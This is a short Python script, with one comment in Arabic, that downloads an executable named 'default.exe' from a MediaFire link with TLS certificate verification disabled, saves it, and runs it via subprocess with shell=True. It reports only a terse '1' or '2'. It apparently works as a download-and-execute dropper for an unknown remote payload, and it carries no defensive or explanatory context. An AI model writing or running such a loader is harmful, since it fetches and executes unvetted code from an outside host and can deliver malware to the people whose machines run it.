import requests
import subprocess

url = 'https://download1591.mediafire.com/vx3tkogiprjgJtCm7uCnfm4d78rsBUQpEstdioXcidphxQTd3ctl2Lyg0SxvhZHP3l6-49gMX5C011A5rKzv3n54PzojFs1rTwJ_XVDWRp02an56MS-T-p-CRd6bOs17joSUKQ98Fr7JM3u6Jk2Xv4JKz0R5A8h2JVu6bAOGofvcKQ/zyl7lxvrwfxai07/default.exe'
myfile = requests.get(url, allow_redirects=True, verify=False)

if myfile.status_code == 200:
    with open("default.exe", "wb") as f:
        f.write(myfile.content)
    print("1")

    # تشغيل الملف .exe باستخدام وحدة subprocess
    try:
        subprocess.run("default.exe", shell=True)
    except Exception as e:
        print("2", e)
else:
    print("2")
